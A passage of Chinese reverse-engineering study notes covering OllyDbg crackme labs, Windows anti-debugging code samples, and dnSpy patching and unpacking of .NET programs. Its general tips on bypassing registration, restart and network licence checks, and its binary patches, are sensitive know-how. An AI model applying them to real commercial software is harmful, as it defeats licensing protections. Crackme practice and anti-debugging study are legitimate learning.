mov word ptr ds:[edi],0x40\n0040109C   .  83C7 02       add edi,0x2\n0040109F   .  C707 E8900000 mov dword ptr ds:[edi],0x90E8\n004010A5   .  83C7 04       add edi,0x4\n004010A8   .  C607 00       mov byte ptr ds:[edi],0x0\n004010AB   .  47            inc edi                                  ;  ReverseM.00401000\n004010AC   .  66:C707 EB2C  mov word ptr ds:[edi],0x2CEB\n;edi=401026,写入两个字节，也就是到401027\n004010B1   .  83EF 15       sub edi,0x15\n004010B4   .  FFD7          call edi                                 ;  ReverseM.00401000\n```\n\n5. 004010B4地址的call指令->00401021地址的call指令：显示主程序\n\n6. 00401054地址的call指令：重新对NAG窗口加密，403000到403128，xor 0x8D\n\n```asm\n00401320  /$  B8 00304000   mov eax,ReverseM.00403000                ;  ASCII \"ReverseMeTutorial\"\n00401325  |>  8030 8D       /xor byte ptr ds:[eax],0x8D\n00401328  |.  40            |inc eax\n00401329  |.  3D 28314000   |cmp eax,ReverseM.00403128\n0040132E  |.^ 7C F5         \\jl short ReverseM.00401325\n00401330  \\.  C3            retn\n```\n\n7. 00401059地址的call指令：退出程序\n\n现在如果想要修改为`push 0x1`，则0040101D地址处的机器码要为6A01。\n\n```asm\n0040101D      6A 01         push 0x1\n```\n\n走进0040129E地址的函数，盯着寄存器窗口的edi值变为1D时，光标走到下面这个位置。\n\n```asm\n00401035   .  66:C707 6A00    mov word ptr ds:[edi],0x6A\n要让它变为\n00401035   .  66:C707 6A01    mov word ptr ds:[edi],0x016A\n```\n\n不能直接修改，因为前面还有个解密过程xor 0x5A。1^5A=5B\n\n66:C707 6A00中的00是00401039，在数据窗口Ctrl+G查找地址，修改为5B即可。\n\n还有一种方法绕过MessageBoxA。这个函数的下面有个无条件跳转指令，不如让它提前执行，绕过MessageBoxA。\n\n```asm\n00401011   $  6A 00           push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n00401013   .  68 7D304000     push ReverseM.0040307D                   ; |Title = \"TutorialNag\"\n00401018   .  68 34304000     push ReverseM.00403034                   ; |Text = \"You need to remove the nag\nTry to do it in a two byte patch. \nRegards!\"\n0040101D      6A 00           push 0x0\n0040101F   .  E8 30020000     call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n00401024   .  EB 44           jmp short ReverseM.0040106A\n```\n\n```asm\n00401011   $  6A 00           push 0x0\n变为\n00401011     /EB 57           jmp short ReverseM.0040106A \n```\n\n所以就是让401011地址的机器码变为EB57。继续盯着edi变为1011时\n\n```asm\n00401013   .  66:C707 6A00    mov word ptr ds:[edi],0x6A               ; |Title\n要让它变为\n00401013      66:C707 EB57    mov word ptr ds:[edi],0x57EB\n```\n\nEB\\^5A=B1，57\\^5A=0D。在数据窗口的401016地址处修改为B10D。(检查401016地址处是否为6A00，是的话再改，不是的话程序先执行到401016地址是6A00为止)\n\n## 30. 反调试\n\n好的软件及病毒、木马等都具备反调试功能，要研究它们，必须先掌握它们的反调试技术，才能提升出反反调试的方案。(禁止套娃！)\n\n### 30.1 Windows API 方法\n\nWin32 提供了两个 API ，`IsDebuggerPresent ` 和 `CheckRemoteDebuggerPresent `可以用来检测当前进程是否正在被调试，以`IsDebuggerPresent` 函数为例，例子如下：\n\n```cpp\n#include<stdio.h>\n#include<Windows.h>\n\nint main()\n{\n    BOOL ret = IsDebuggerPresent();\n    printf(\"ret = %d\\n\", ret);\n}\n//在VS中F5\tret = 1\n//Ctrl+F5\t ret = 0\n```\n\n破解方法很简单，就是在系统里将这两个函数 hook 掉，让这两个函数一直返回 false 就可以了，网上有很多做 hook API 工作的工具，也有很多工具源代码是开放的，所以这里就不细谈了。\n\n### 30.2 查询进程 PEB 的 BeingDebugged 标志位\n\n当进程被调试器所附加的时候，操作系统会自动设置这个标志位，因此在程序里定期查询这个标志位就可以了，例子如下： \n\n```c\nbool PebIsDebuggedApproach()\n{\n       char result = 0;\n       __asm\n       {\n            // 进程的PEB地址放在fs这个寄存器位置上\n            mov eax, fs:[30h]\n            // 查询BeingDebugged标志位\n            mov al, BYTE PTR [eax + 2] \n            mov result, al\n       }\n       return result != 0;\n}\n```\n\n### 30.3 查询进程 PEB 的 NtGlobal 标志位 \n\n跟第二个方法一样，当进程被调试的时候，操作系统除了修改 BeingDebugged 这个标志位以外，还会修改其他几个地方，其中NtDll 中一些控制堆（Heap）操作的函数的标志位就会被修改，因此也可以查询这个标志位，例子如下： \n\n```c\nbool PebNtGlobalFlagsApproach()\n{\n       int result = 0;\n       __asm\n       {\n           // 进程的PEB\n           mov eax, fs:[30h]\n           // 控制堆操作函数的工作方式的标志位\n           mov eax, [eax + 68h]\n           // 操作系统会加上这些标志位FLG_HEAP_ENABLE_TAIL_CHECK, \n           // FLG_HEAP_ENABLE_FREE_CHECK and FLG_HEAP_VALIDATE_PARAMETERS，\n           // 它们的并集就是x70\n           //\n           // 下面的代码相当于C/C++的\n           // eax = eax & 0x70\n           and eax, 0x70\n           mov result, eax\n       }\n       return result != 0;\n \n}\n```\n\n### 30.4 查询进程堆的一些标志位\n\n这个方法是第三个方法的变种，只要进程被调试，进程在堆上分配的内存，在分配的堆的头信息里，ForceFlags 这个标志位会被修改，因此可以通过判断这个标志位的方式来反调试。因为进程可以有很多的堆，因此只要检查任意一个堆的头信息就可以了，所以这个方法貌似很强大，例子如下： \n\n```c\nbool HeapFlagsApproach()\n{\n       int result = 0;\n       __asm\n       {\n           // 进程的PEB\n           mov eax, fs:[30h]\n           // 进程的堆，我们随便访问了一个堆，下面是默认的堆\n           mov eax, [eax + 18h]\n           // 检查ForceFlag标志位，在没有被调试的情况下应该是\n           mov eax, [eax + 10h]\n           mov result, eax\n       }\n       return result != 0;\n}\n```\n\n### 30.5 使用 NtQueryInformationProcess 函数\n\n`NtQueryInformationProcess`函数是一个未公开的 API，它的第二个参数可以用来查询进程的调试端口。如果进程被调试，那么返回的端口值会是 -1，否则就是其他的值。由于这个函数是一个未公开的函数，因此需要使用 LoadLibrary 和 GetProceAddress的方法获取调用地址，示例代码如下： \n\n```c\n// 声明一个函数指针。\n \ntypedef NTSTATUS (WINAPI *NtQueryInformationProcessPtr)(\n       HANDLE processHandle,\n       PROCESSINFOCLASS processInformationClass,\n       PVOID processInformation,\n       ULONG processInformationLength,\n       PULONG returnLength);\n \n \nbool NtQueryInformationProcessApproach()\n{\n       int debugPort = 0;\n       HMODULE hModule = LoadLibrary(TEXT(\"Ntdll.dll \"));\n       NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, \"NtQueryInformationProcess\");\n \n       if ( NtQueryInformationProcess(GetCurrentProcess(), (PROCESSINFOCLASS)7, &debugPort, sizeof(debugPort), NULL) )\n              printf(\"[ERROR NtQueryInformationProcessApproach] NtQueryInformationProcess failed\\n\");\n \n       else\n              return debugPort == -1;\n       return false;\n \n}\n```\n\n### 30.6 NtSetInformationThread 方法\n\n这个也是使用 Windows 的一个未公开函数的方法，你可以在当前线程里调用 NtSetInformationThread，调用这个函数时，如果在第二个参数里指定 0x11 这个值（意思是 ThreadHideFromDebugger ），等于告诉操作系统，将所有附加的调试器统统取消掉。示例代码：\n\n```c\n// 声明一个函数指针。\n \ntypedef NTSTATUS (*NtSetInformationThreadPtr)(HANDLE threadHandle,\n       THREADINFOCLASS threadInformationClass,\n       PVOID threadInformation,\n       ULONG threadInformationLength);\n \nvoid NtSetInformationThreadApproach()\n{\n      HMODULE hModule = LoadLibrary(TEXT(\"ntdll.dll\"));\n      NtSetInformationThreadPtr NtSetInformationThread = (NtSetInformationThreadPtr)GetProcAddress(hModule, \"NtSetInformationThread\");\n      NtSetInformationThread(GetCurrentThread(), (THREADINFOCLASS)0x11, 0, 0);\n \n}\n```\n\n### 30.7 触发异常的方法\n\n这个技术的原理是，首先，进程使用 SetUnhandledExceptionFilter 函数注册一个未处理异常处理函数A，如果进程没有被调试的话，那么触发一个未处理异常，会导致操作系统将控制权交给先前注册的函数A；而如果进程被调试的话，那么这个未处理异常会被调试器捕捉，这样我们的 函数A 就没有机会运行了。\n\n这里有一个技巧，就是触发未处理异常的时候，如果跳转回原来代码继续执行，而不是让操作系统关闭进程。方案是在函数A里修改eip的值，因为在函数A的参数`_EXCEPTION_POINTERS`里，会保存当时触发异常的指令地址，所以在 函数A 里根据这个指令地址修改寄存器eip的值就可以了，示例代码如下：\n\n```cpp\n \n \n// 进程要注册的未处理异常处理程序A\nLONG WINAPI MyUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *pei)\n{\n       SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)\n              pei->ContextRecord->Eax);\n       // 修改寄存器eip的值\n       pei->ContextRecord->Eip += 2;\n       // 告诉操作系统，继续执行进程剩余的指令（指令保存在eip里），而不是关闭进程\n       return EXCEPTION_CONTINUE_EXECUTION;\n}\n \n \nbool UnhandledExceptionFilterApproach()\n{\n \n       SetUnhandledExceptionFilter(MyUnhandledExceptionFilter);\n       __asm\n \n       {\n              // 将eax清零\n              xor eax, eax\n              // 触发一个除零异常\n              div eax\n       }\n       return false;\n \n}\n```\n\n### 30.8 调用 DeleteFiber 函数\n\n如果给 DeleteFiber 函数传递一个无效的参数的话，DeleteFiber函数除了会抛出一个异常以外，还是将进程的LastError值设置为具体出错原因的代号。然而，如果进程正在被调试的话，这个LastError值会被修改，因此如果调试器绕过了第七步里讲的反调试技术的话，我们还可以通过验证LastError值是不是被修改过来检测调试器的存在，示例代码： \n\n```c\nbool DeleteFiberApproach()\n{\n       char fib[1024] = {0};\n       // 会抛出一个异常并被调试器捕获\n       DeleteFiber(fib);\n       // 0x57的意思是ERROR_INVALID_PARAMETER\n       return (GetLastError() != 0x57);\n}\n```\n\n## 31. 实验十八 ReverseMe反调试\n\n{% asset_img 实验18.png 实验18 %}\n\n这四个都可以利用Keyfile.dat正确打开，但它们利用了不同的反调试技术。\n\n### 31.1 ReverseMe.A\n\n这个要用原版OD，吾爱太强大了，直接给通过。\n\n{% asset_img 实验18.1.png 实验18.1 %}\n\nF8一路走，弹窗下断点，跟进去。\n\n```asm\n004010D3   > E8 23000000                 CALL ReverseM.004010FB;弹窗，跟进去\n004010D8   . 83FE 08                     CMP ESI,8\n004010DB   . 7C 05                       JL SHORT ReverseM.004010E2\n004010DD   . E8 2C000000                 CALL ReverseM.0040110E\n004010E2   > 6A 00                       PUSH 0                                                        ; |/Style = MB_OK|MB_APPLMODAL\n004010E4   . 68 00204000                 PUSH ReverseM.00402000                                        ; ||Title = \" Key File ReverseMe\"\n004010E9   . 68 86204000                 PUSH ReverseM.00402086                                        ; ||Text = \"Keyfile is not valid. Sorry.\"\n004010EE   . 6A 00                       PUSH 0                                                        ; ||hOwner = NULL\n004010F0   . E8 72020000                 CALL <JMP.&user32.MessageBoxA>                                ; |\\MessageBoxA\n004010F5   . E8 BF010000                 CALL <JMP.&kernel32.ExitProcess>                              ; \\ExitProcess\n004010FA   . C3                          RETN\n004010FB   $ E8 D7010000                 CALL <JMP.&kernel32.IsDebuggerPresent>                        ; [IsDebuggerPresent\n;调用IsDebuggerPresent函数\n00401100   . 83F8 01                     CMP EAX,1\n;返回值1表示在调试，0表示无调试\n00401103   .^74 DD                       JE SHORT ReverseM.004010E2\n00401105   . C3                          RETN\n00401106   . 6A 00                       PUSH 0                                                        ; /ExitCode = 0\n00401108   . E8 AC010000                 CALL <JMP.&kernel32.ExitProcess>                              ; \\ExitProcess\n0040110D   . C3                          RETN\n0040110E  /$ 6A 00                       PUSH 0                                                        ; |/Style = MB_OK|MB_APPLMODAL\n00401110  |. 68 00204000                 PUSH ReverseM.00402000                                        ; ||Title = \" Key File ReverseMe\"\n00401115  |. 68 51204000                 PUSH ReverseM.00402051                                        ; ||Text = \" You really did it! Congratz !!!\"\n0040111A  |. 6A 00                       PUSH 0                                                        ; ||hOwner = NULL\n0040111C  |. E8 46020000                 CALL <JMP.&user32.MessageBoxA>                                ; |\\MessageBoxA\n00401121  \\. E8 93010000                 CALL <JMP.&kernel32.ExitProcess>                              ; \\ExitProcess\n00401126   . C3                          RETN\n```\n\n```asm\n00401103   .^74 DD                       JE SHORT ReverseM.004010E2\n修改为\n00401103     90                          NOP\n00401104     90                          NOP\n```\n\n{% asset_img 实验18.2.png 实验18.2 %}\n\n在OD运行也成功了。\n\n### 31.2 ReverseMe.B\n\n点击运行，OD停在了401106处，执行不下去。\n\n{% asset_img 实验18.3.png 实验18.3 %}\n\n重载，一路F8步过，是从4010D3地址处的call指令去到10FB地址再去到1106卡住。\n\n```asm\n![实验18.4](F:\\markdown图片\\OD使用教程\\实验18.4.png)004010D3   > E8 23000000    CALL ReverseM.004010FB\n004010D8   . 83FE 08        CMP ESI,8\n004010DB   . 7C 05          JL SHORT ReverseM.004010E2\n004010DD   . E8 2C000000    CALL ReverseM.0040110E\n004010E2   > 6A 00          PUSH 0                                   ; |/Style = MB_OK|MB_APPLMODAL\n004010E4   . 68 00204000    PUSH ReverseM.00402000                   ; ||Title = \" Key File ReverseMe\"\n004010E9   . 68 86204000    PUSH ReverseM.00402086                   ; ||Text = \"Keyfile is not valid. Sorry.\"\n004010EE   . 6A 00          PUSH 0                                   ; ||hOwner = NULL\n004010F0   . E8 72020000    CALL <JMP.&user32.MessageBoxA>           ; |\\MessageBoxA\n004010F5   . E8 BF010000    CALL <JMP.&kernel32.ExitProcess>         ; \\ExitProcess\n004010FA   . C3             RETN\n004010FB  /$ E8 D7010000    CALL <JMP.&kernel32.IsDebuggerPresent>   ; [IsDebuggerPresent\n00401100  |. 83F8 01        CMP EAX,1\n00401103  |. 74 01          JE SHORT ReverseM.00401106\n00401105  |. C3             RETN\n00401106  |> 8925 21114000  MOV DWORD PTR DS:[401121],ESP\n;跳到一个错误位置\n0040110C  \\. C3             RETN\n```\n\n同样nop掉关键跳转指令不让它跳转\n\n```asm\n00401103  |. 74 01          JE SHORT ReverseM.00401106\n修改为\n00401103     90             NOP\n00401104     90             NOP\n```\n\n### 31.3 ReverseMe.C\n\n{% asset_img 实验18.4.png 实验18.4 %}\n\n这一次是直接退出程序了。\n\n```asm\n004010D3   > E8 23000000    CALL ReverseM.004010FB\n004010D8   . 83FE 08        CMP ESI,8\n004010DB   . 7C 05          JL SHORT ReverseM.004010E2\n004010DD   . E8 2C000000    CALL ReverseM.0040110E\n004010E2   > 6A 00          PUSH 0                                   ; |/Style = MB_OK|MB_APPLMODAL\n004010E4   . 68 00204000    PUSH ReverseM.00402000                   ; ||Title = \" Key File ReverseMe\"\n004010E9   . 68 86204000    PUSH ReverseM.00402086                   ; ||Text = \"Keyfile is not valid. Sorry.\"\n004010EE   . 6A 00          PUSH 0                                   ; ||hOwner = NULL\n004010F0   . E8 72020000    CALL <JMP.&user32.MessageBoxA>           ; |\\MessageBoxA\n004010F5   . E8 BF010000    CALL <JMP.&kernel32.ExitProcess>         ; \\ExitProcess\n004010FA   . C3             RETN\n004010FB  /$ E8 D7010000    CALL <JMP.&kernel32.IsDebuggerPresent>   ; [IsDebuggerPresent\n00401100  |. 83F8 01        CMP EAX,1\n00401103  |. 74 01          JE SHORT ReverseM.00401106\n00401105  |. C3             RETN\n00401106  |> 6A 00          PUSH 0                                   ; /ExitCode = 0\n00401108  \\. E8 AC010000    CALL <JMP.&kernel32.ExitProcess>         ; \\ExitProcess\n0040110D   . C3             RETN\n```\n\n又是改那个je跳转。\n\n### 31.4 ReverseMe.D\n\n{% asset_img 实验18.5.png 实验18.5 %}\n\n这次直接变空白了，OD要傻掉了。\n\n```asm\n004010D3   > E8 23000000    CALL ReverseM.004010FB\n004010D8   . 83FE 08        CMP ESI,8\n004010DB   . 7C 05          JL SHORT ReverseM.004010E2\n004010DD   . E8 2C000000    CALL ReverseM.0040110E\n004010E2   > 6A 00          PUSH 0                                   ; |/Style = MB_OK|MB_APPLMODAL\n004010E4   . 68 00204000    PUSH ReverseM.00402000                   ; ||Title = \" Key File ReverseMe\"\n004010E9   . 68 86204000    PUSH ReverseM.00402086                   ; ||Text = \"Keyfile is not valid. Sorry.\"\n004010EE   . 6A 00          PUSH 0                                   ; ||hOwner = NULL\n004010F0   . E8 72020000    CALL <JMP.&user32.MessageBoxA>           ; |\\MessageBoxA\n004010F5   . E8 BF010000    CALL <JMP.&kernel32.ExitProcess>         ; \\ExitProcess\n004010FA   . C3             RETN\n004010FB  /$ E8 D7010000    CALL <JMP.&kernel32.IsDebuggerPresent>   ; [IsDebuggerPresent\n00401100  |. 83F8 01        CMP EAX,1\n00401103  |. 74 01          JE SHORT ReverseM.00401106\n00401105  |. C3             RETN\n00401106  \\> FFE0           JMP EAX\n;跳到内存00000001位置，不是程序领空\n00401108   . E8 01000000    CALL ReverseM.0040110E\n0040110D   . C3             RETN\n```\n\n又是改je就可。\n\n## 32. 实验十九 Debugger Detected\n\n{% asset_img 实验19.png 实验19 %}\n\n这个连英文原版OD都可以逃过检测，那还是用回熟悉的OD来调试它吧。\n\n这个程序在没有调试器开启的情况下就会显示上图，但它如果探测到调试器启动时，它会弹窗“Your debugger is detected!”\n\n将它载入OD，遇到问题下断点跟进，但一进去是DLL领空，Alt+F9出不来，一直在DLL领空循环。搜索一下我们要进去的API函数`DialogBoxParamA`(其实API函数可以不跟进，因为调用的全都是dll领空里面的内容)\n\n### 32.1 DialogBoxParam\n\n```c\nint DialogBoxParam(\n    HINSTANCE hInstance,//标识一个模块的实例，该模块的可执行文件含有对话框模板\n    LPCTSTR IpTemplateName,//标识对话框模板\n    HWND hWndParent,//指定拥有对话框的窗口\n    DLGPROC IPDialogFunc,//指向对话框过程的指针\n    LPARAM dwlnitParam//指定传递到对话框过程中的 WM_INITDIALOG 消息 IParam 参数的值\n);\n```\n\n也就是说`IPDialogFunc`指向的地址就是实现函数的过程。\n\n```asm\n0040106C  |.  6A 00         push 0x0                                 ; /lParam = NULL\n0040106E  |.  68 8C104000   push Debugger.0040108C                   ; |DlgProc = Debugger.0040108C\n00401073  |.  6A 00         push 0x0                                 ; |hOwner = NULL\n00401075  |.  68 04304000   push Debugger.00403004                   ; |pTemplate = \"KeyGenDialog\"\n0040107A  |.  FF35 CC344000 push dword ptr ds:[0x4034CC]             ; |hInst = 00400000\n00401080  |.  E8 C9030000   call <jmp.&user32.DialogBoxParamA>       ; \\DialogBoxParamA\n```\n\n指向0040108C，所以这个地址就是我们要找的地方。在函数入口处下断点，试运行，又回到了这个断点处，说明这个函数被调用了两次。第一次jnz跳过，第二次jnz不跳过。\n\n```asm\n0040108C  /.  55            push ebp\n0040108D  |.  8BEC          mov ebp,esp\n0040108F  |.  53            push ebx\n00401090  |.  817D 0C 10010>cmp [arg.2],0x110\n00401097  |.  75 3B         jnz short Debugger.004010D4\n00401099  |.  74 01         je short Debugger.0040109C\n0040109B  |.  CC            int3\n0040109C  |>  8BC0          mov eax,eax                              ;  Debugger.0040108C\n0040109E  |.  E8 28010000   call Debugger.004011CB\n```\n\n去到0040109E处弹出错误，跟进函数。\n\n```asm\n004011CB  /$  55            push ebp\n004011CC  |.  8BEC          mov ebp,esp\n004011CE  |.  81C4 D4FEFFFF add esp,-0x12C\n004011D4  |.  53            push ebx\n004011D5  |.  56            push esi\n004011D6  |.  57            push edi                                 ;  Debugger.0040304C\n004011D7  |.  6A 00         push 0x0                                 ; /ProcessID = 0x0\n004011D9  |.  6A 0F         push 0xF                                 ; |Flags = TH32CS_SNAPALL\n004011DB  |.  E8 3E020000   call <jmp.&kernel32.CreateToolhelp32Snap>; \\CreateToolhelp32Snapshot\t\t创建进程快照\n004011E0  |.  8945 FC       mov [local.1],eax\n004011E3  |.  8DB5 D4FEFFFF lea esi,[local.75]\n004011E9  |.  8D3D 4C304000 lea edi,dword ptr ds:[0x40304C]\n004011EF  |.  56            push esi                                 ; /lppe\n004011F0  |.  FF75 FC       push [local.1]                           ; |hSnapshot = 00000258\n004011F3  |.  E8 38020000   call <jmp.&kernel32.Process32First>      ; \\Process32First\n004011F8  |.  85C0          test eax,eax\n004011FA  |.  74 2B         je short Debugger.00401227\n004011FC  |.  8D46 24       lea eax,dword ptr ds:[esi+0x24]\n004011FF  |.  50            push eax                                 ; /String2 = 00000258 ???\t\t获取第一个进程名字\n00401200  |.  57            push edi                                 ; |String1 = \"OLLYDBG.EXE\"\n00401201  |.  E8 3C020000   call <jmp.&kernel32.lstrcmpiA>           ; \\lstrcmpiA\t\t\t\t\t与OLLYDBG.EXE对比\n00401206  |.  85C0          test eax,eax\n00401208  |.  74 2A         je short Debugger.00401234\n;如果进程名字有OLLYDBG.EXE则弹框说Your debugger is detected !!!\n0040120A  |>  56            /push esi                                ; /lppe\n0040120B  |.  FF75 FC       |push [local.1]                          ; |hSnapshot = 00000258\n0040120E  |.  E8 23020000   |call <jmp.&kernel32.Process32Next>      ; \\Process32Next\n00401213  |.  85C0          |test eax,eax\n00401215  |.  74 10         |je short Debugger.00401227\n00401217  |.  8D46 24       |lea eax,dword ptr ds:[esi+0x24]\n0040121A  |.  50            |push eax                                ; /String2 = 00000258 ???\t\t获取除第一个进程的名字\n0040121B  |.  57            |push edi                                ; |String1 = \"OLLYDBG.EXE\"\n0040121C  |.  E8 21020000   |call <jmp.&kernel32.lstrcmpiA>          ; \\lstrcmpiA\t\t\t\t\t与OLLYDBG.EXE对比\n00401221  |.  85C0          |test eax,eax\n00401223  |.  74 0F         |je short Debugger.00401234\n;如果进程名字有OLLYDBG.EXE则弹框说Your debugger is detected !!!\n00401225  |.^ EB E3         \\jmp short Debugger.0040120A\n00401227  |>  FF75 FC       push [local.1]                           ; /hObject = 00000258\n0040122A  |.  E8 E9010000   call <jmp.&kernel32.CloseHandle>         ; \\CloseHandle\n0040122F  |.  5F            pop edi                                  ;  0019F9B0\n00401230  |.  5E            pop esi                                  ;  0019F9B0\n00401231  |.  5B            pop ebx                                  ;  0019F9B0\n00401232  |.  C9            leave\n00401233  |.  C3            retn\n00401234  |>  6A 10         push 0x10                                ; /Style = MB_OK|MB_ICONHAND|MB_APPLMODAL\n00401236  |.  68 11304000   push Debugger.00403011                   ; |Title = \"Debugger Detected tutorial    \"\n0040123B  |.  68 58304000   push Debugger.00403058                   ; |Text = \"Your debugger is detected !!!\"\n00401240  |.  FF75 08       push [arg.1]                             ; |hOwner = 00000001\n00401243  |.  E8 24020000   call <jmp.&user32.MessageBoxA>           ; \\MessageBoxA\n00401248  |.  50            push eax                                 ; /ExitCode = 0x258\n00401249  \\.  E8 D6010000   call <jmp.&kernel32.ExitProcess>         ; \\ExitProcess\n```\n\n代码分析得很清楚了，在调用`CreateToolhelp32Snapshot`函数的时候会拍一张快照，记录本机所有的进程，再将所有的进程名字与`OLLYDBG.EXE`对比，如果相同则弹窗有调试器。\n\n破解也很简单，直接绕过0040109E处，改上面的跳转指令即可。\n\n```asm\n00401097  |.  75 3B         jnz short Debugger.004010D4\n修改为\n00401097     /EB 3B         jmp short Debugger.004010D4\n```\n\n## 33. 万能断点特征码\n\n如果字符串，API函数都不管用，可试试万能断点特征码。\n\n```\nF3 A5 8B C8 83 E1 03 F3 A4 E8\n```\n\n在需要操作前的那一刻下断，比如想要输入注册码后点击按钮后可以断下，就先输入好注册码，再下断，再点击按钮。如果先下断再输入注册码，在输入注册码时，就会断下。\n\nXP系统可用，Win10未知是否可行。\n\n## 34. 不算总结的总结\n\n这些总结都是看Shark恒的逆向教程扫盲扫出来的，我手上也没那么多程序一个个过，所以不懂的话就去看Shark恒的视频，一个视频就10分钟左右，花不了多长时间。\n\n### 34.1 BC++和Delphi\n\nBC++和Delphi都可以使用DeDe(DelphiDecompiler)查看按钮事件(点击按钮后运行的程序地址)。\n\nBC++需要手动修复IAT，在OEP最近的一个call进去，发现全是jmp系统函数，找到第一个jmp系统函数右键，数据窗口跟随，取第一个系统函数的偏移地址作为IAT首地址，大小取1000，将无效指针剪切掉即可。\n\n[Shark恒逆向教程 BC++假自校验](https://www.bilibili.com/video/BV1cw411Z7Ab?p=18)\n\n[Shark恒逆向教程 DephiDecompiler用法](https://www.bilibili.com/video/BV1cw411Z7Ab?p=19)\n\n### 34.2 易语言\n\n用易语言编写的软件可以用push窗体法，易语言按钮事件FF 55 FC 5F 5E，窗体事件FF 25。Ctrl+G去到易语言窗体事件处，附近有个push xxxx，这个就是第一个展示在屏幕的窗口的指令。程序有多个窗体事件，我们的目的就是将我们需要的窗体事件的地址粘贴到那个push里，让它执行我们想要的窗体。Ctrl+F查找命令 push 10001，往下数第二行就是push 窗体事件的地址，将指令复制粘贴到FF25处附近的push xxxx。保存文件。如果不是我们想要的窗体，继续Ctrl+L查找下一个，重复上面操作，直至找到我们想要的窗口。但这种方法容易触发暗桩，比如蓝屏，关机等，所以慎用！\n\n[Shark恒逆向教程 push窗体法](https://www.bilibili.com/video/BV1cw411Z7Ab?p=23)\n\n### 34.3 VB\n\nVB写的程序，如果这个程序很大，手动下按钮事件可能非常多，所以可以用脚本帮我们下按钮事件断点。如果是重启验证类的软件，要注意程序还没打开就停在断点处的断点，找到是否有cmp ax,0xFFFF，这个直接影响下面的关键跳，所以一定要注意。也就是为什么不能修改返回值为1，因为它是与0xFFFF比较的。如果有些地方还显示未注册，说明有其它跳转到未注册处，搜索命令cmp ax,0xFFFF下断一个个判断，直至全显示已注册。\n\n[Shark恒逆向教程 VB通用技巧](https://www.bilibili.com/video/BV1cw411Z7Ab?p=26)\n\n如果VB程序打开后自动退出，可以查找所有模块间的调用，找退出程序的函数。VB的退出程序函数是`__vbaEnd`。如果程序含有暗桩，可以看 [Shark恒逆向教程 取消关机暗桩](https://www.bilibili.com/video/BV1cw411Z7Ab?p=27) 。\n\n### 34.4 重启验证类程序\n\n重启验证类型的软件改关键跳不管用，因为每次重启都要检验注册码，如果注册码不对还是要重新注册，所以要进入到关键call找到注册码或破解。\n\n### 34.5 网络验证类程序\n\n如果运行到某处卡住，可能在进行网络验证，将这个call指令nop掉，再将紧接着的跳转指令也nop掉。\n\n### 34.6 快速定位的小技巧\n\n载入OD运行，输入假码后弹出提示框，此时回到OD暂停，Alt+F9返回到用户代码，回到程序点击提示框按钮，OD成功回到用户代码。点击暂停后也可以用调用堆栈的方法回到用户代码。\n\n[Shark恒逆向教程 暂停法找注册码](https://www.bilibili.com/video/BV1cw411Z7Ab?p=21)\n\n### 34.7 关于OD的琐碎小知识\n\n如果在OD鼠标与选中行不一致，可以Ctrl + A分析，就正常了。\n\n去除花指令：插件 -> E Junk Code -> MainDlg，VA是执行到花指令的地方，大小改999就行。\n\n# 二、x64dbg\n\n1. 字符串搜索：CPU(反汇编)窗口->鼠标右键->搜索->选择模块(根据个人需求选择，一般选择当前模块，前提是得先执行到主模块)->字符串\n2. 用space改汇编语言\n3. 保存修改到文件：反汇编窗口右键->补丁->修补文件\n\n","categories":["Windows逆向"],"tags":["OllyDbg","x64dbg"]},{"title":".Net逆向教程","url":"/posts/784f7e1d.html","content":"\n`.Net`程序载入OD直接就运行起来了，完全没给我们调试的机会。针对这种程序，其实有专门的调试软件，比如dnSpy。其实调试流程跟OD差不多，在此只是熟悉一下dnSpy的运用。\n\n这个笔记是跟着up主muruoxi学习`.Net`逆向，[这是她的.Net逆向专栏](https://www.bilibili.com/read/readlist/rl73962?spm_id_from=333.999.0.0) 。\n\n<!--more-->\n\n# 1. 静态分析\n\n拿去查壳，发现它是C#写32位的.net程序。\n\n{% asset_img 1.1.png 查壳 %}\n\n{% asset_img 1.2.png 运行程序 %}\n\n载入dnSpy，编辑 -> 搜索程序集，选择搜索数字/字符串，输入“登陆失败”，就可以定位到代码处。\n\n{% asset_img 1.3.png dnSpy分析 %}\n\n这个看起来是不是特别像Java写的程序，C#我没接触过，但C#跟Java很像我是见识到了。程序逻辑很简单，如果文本框1的文本长度为-1则登录成功。很明显这是不可能实现的。我们的目的就是要修改这个if语句。在这个方法内右键 -> 编辑方法。修改完后点击编译。\n\n{% asset_img 1.4.png 修改代码 %}\n\n文件 -> 全部保存，确定。\n\n{% asset_img 1.5.png 保存 %}\n\n此时，再次打开原程序，无论输入什么都显示“登录成功”。\n\n{% asset_img 1.6.png 登录成功 %}\n\n# 2. 动态调试\n\nC#写32位的.net程序，无壳。载入dnSpy读代码。\n\n{% asset_img 2.1.png 运行程序 %}\n\n超级简单，注册码就是用户名的RSA值。\n\n{% asset_img 2.2.png dnSpy分析 %}\n\n那这个RSA怎么得到？使用动态调试。选中第22行F9下断或右键 -> 添加断点。\n\n{% asset_img 2.3.png dnSpy分析 %}\n\nF5开始调试，此时dnSpy显示在运行中。输入用户名与注册码后，点击按钮，dnSpy停在断点处。\n\n{% asset_img 2.4.png dnSpy分析 %}\n\n但此时`text`和`text2`的值都为空，F11步入，F10步过，两次F10之后，`text`和`text2`的值都出来了。\n\n{% asset_img 2.5.png dnSpy分析 %}\n\n`text`中的值就是我们需要的RSA值。选中`text`行，右键 -> 复制值，将引号去掉，就是v5le0n9对应的注册码。\n\n```\nWgvOIwqEgAHU+Kfq6nVDMXbRw4SzUDh2RUOIjkwwEajSmRXuuRFZRV173AZum6hXx6USTCMIsCnQnpQjKpf7Q0efrYzsjnuEkOU0BGUs+SUWBS3dFCpNcLdqLp6UNIM1bJp4l+P0kDdSWHdJzGFdBUEkmQteAp3Dfbf+B3r8q70=\n```\n\n取消断点，F5继续。将正确的注册码填上，左上角已经显示“已注册”字样。\n\n{% asset_img 2.6.png dnSpy分析 %}\n\n但是不知道如何保存这个“已注册”的状态，因为它每次的RSA值都会变。\n\n那我只能爆破了，将“==”修改为“!=”。\n\n# 3. 壳与脱壳\n\n载入DIE发现有.NET Reactor(4.8-4.9)的壳，.NET壳非常好脱，用de4dot就可轻松脱去。\n\n{% asset_img 3.1.png .net壳 